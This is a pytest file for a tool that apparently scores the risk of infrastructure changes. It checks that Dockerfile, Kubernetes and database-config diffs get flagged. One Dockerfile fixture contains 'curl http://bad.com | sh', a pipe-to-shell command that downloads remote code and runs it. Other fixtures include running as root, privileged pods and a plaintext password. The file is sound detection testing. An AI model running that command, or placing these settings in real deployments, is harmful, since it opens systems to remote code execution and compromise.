import pytest
import asyncio
from backend.app.analyzers.diff_parser import DiffParser
from backend.app.analyzers.risk_analyzer import risk_analyzer
from backend.app.database.schema import init_db


@pytest.fixture(autouse=True)
def setup_db():
    init_db()


def test_diff_parser_dockerfile():
    diff = "+USER root\n+EXPOSE 22\n+curl http://bad.com | sh"
    parsed = DiffParser.parse_dockerfile(diff)
    assert len(parsed["findings"]) == 3
    assert parsed["weight"] >= 60


def test_diff_parser_k8s():
    diff = "+privileged: true\n+hostNetwork: true"
    parsed = DiffParser.parse_k8s(diff)
    assert len(parsed["findings"]) == 2
    assert parsed["weight"] >= 50


def test_risk_analyzer_calculation():
    async def _run():
        db_diff = "+DB_HOST=postgres-cluster.internal:5432\n+password=plaintext123"
        result = await risk_analyzer.analyze(
            db_config_diff=db_diff,
            strategy="rolling"
        )
        assert result["risk_score"] > 40
        assert result["risk_category"] in ["Medium", "High"]
        assert len(result["recommended_preventive_actions"]) > 0
        assert "rule_score_breakdown" in result

    asyncio.run(_run())
